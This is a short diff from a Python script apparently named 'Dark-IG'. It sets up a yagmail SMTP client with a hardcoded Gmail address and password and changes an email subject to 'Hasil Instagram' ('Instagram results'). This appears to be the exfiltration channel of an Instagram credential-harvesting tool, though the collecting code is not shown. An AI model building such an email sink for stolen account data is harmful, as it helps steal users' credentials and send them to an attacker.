@@ -3,7 +3,7 @@ j# Dark-IG
 # coding=utf-8
 import socket,struct,os,sys,time,yagmail
 x=yagmail.SMTP('hayyukklah@gmail.com','yahahahayyukk')
-subject='Hasil UwU Mr.Forefax'
+subject='Hasil Instagram Mr.Forefax'
 logo = """
 \033[37;1m██████╗  █████╗ ██████╗ ██╗  ██╗     ██╗███╗   █>
 \033[37;1m██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝     ██║████╗  █>
